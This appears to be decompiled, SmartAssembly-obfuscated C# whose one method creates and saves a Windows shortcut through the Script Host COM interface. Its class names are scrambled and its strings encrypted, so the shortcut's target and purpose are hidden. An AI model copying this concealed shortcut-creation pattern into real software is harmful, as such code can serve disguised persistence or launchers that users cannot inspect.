using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gTywbHaKSaZFRYP;

public sealed class gzHrEevdICapb
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface ubdaKJQkVPtH
	{
		[DispId(0)]
		string jdliIkvObHvoS
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string QTlRrajnRAcoO
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string hoHhTFpEHGHcF
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string WIAcBwwvmrtyiU
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string VOYKLDTSJvyGm
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string PeUVjIfCDDfYi
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string dHgyPdZYcjF
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int wFxOPGNzivJsKN
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string JzFIbLyPBC
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type bwvhPZRfFkq;

	private static object VNNRhawXHJCFpgzZ;

	[NonSerialized]
	internal static GetString getString_0;

	public static void BCBpHyoERcoy(string string_0, string string_1, string string_2, string string_3, string string_4, string string_5, string string_6)
	{
		try
		{
			ubdaKJQkVPtH ubdaKJQkVPtH = (ubdaKJQkVPtH)bwvhPZRfFkq.InvokeMember(PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107402239)), BindingFlags.InvokeMethod, null, VNNRhawXHJCFpgzZ, new object[1] { string_0 });
			ubdaKJQkVPtH.hoHhTFpEHGHcF = string_4;
			ubdaKJQkVPtH.WIAcBwwvmrtyiU = string_5;
			ubdaKJQkVPtH.dHgyPdZYcjF = string_1;
			ubdaKJQkVPtH.JzFIbLyPBC = string_3;
			ubdaKJQkVPtH.QTlRrajnRAcoO = string_2;
			if (!string.IsNullOrEmpty(string_6))
			{
				ubdaKJQkVPtH.VOYKLDTSJvyGm = string_6;
			}
			ubdaKJQkVPtH.Save();
		}
		catch (Exception ex)
		{
			if (PYtJscelCaHU.CWJvOLeqgyddlcWAG)
			{
				try
				{
					File.AppendAllText(PYtJscelCaHU.CaiUUOOprZSOI, getString_0(107401666) + ex.Message + getString_0(107396793));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static gzHrEevdICapb()
	{
		Strings.CreateGetStringDelegate(typeof(gzHrEevdICapb));
		bwvhPZRfFkq = Type.GetTypeFromProgID(PYtJscelCaHU.sZXTHnjVRHJHh(getString_0(107401653)));
		VNNRhawXHJCFpgzZ = Activator.CreateInstance(bwvhPZRfFkq);
	}
}
